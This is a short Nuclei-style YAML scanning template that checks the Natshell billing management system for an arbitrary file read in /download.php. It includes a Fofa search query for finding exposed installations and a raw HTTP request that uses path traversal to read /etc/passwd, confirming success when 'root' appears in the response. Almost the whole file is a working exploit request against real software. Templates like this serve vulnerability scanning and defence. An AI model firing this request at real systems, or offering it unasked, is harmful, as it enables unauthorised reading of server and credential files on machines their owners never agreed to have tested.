id: Natshell_download_Fileread

info:
  name: Natshell_download_Fileread
  author: HK
  severity: high
  description: 蓝海卓越计费管理系统/download.php接口存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body="http://www.natshell.com"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /download.php?file=../../../../../etc/passwd HTTP/1.1
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
    X-Requested-With: XMLHttpRequest

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - root